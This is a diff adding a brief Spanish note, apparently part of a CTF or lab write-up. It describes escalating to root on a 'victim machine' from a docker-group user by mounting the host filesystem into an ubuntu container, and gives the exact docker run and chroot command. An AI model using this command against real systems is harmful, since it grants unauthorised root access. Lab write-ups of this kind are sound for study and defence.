@@ -1,0 +1,3 @@
+Aparecemos en una máquina con un usuario en el grupo docker. Vemos que hay una imagen de ubuntu por lo que vamos a montar en la imagen de ubuntu el sistema de archivos de la máquina victima obteniendo así permisos de root.
+
+docker run -v /:/mnt  -it --rm 5a81c4b8502e chroot /mnt bash
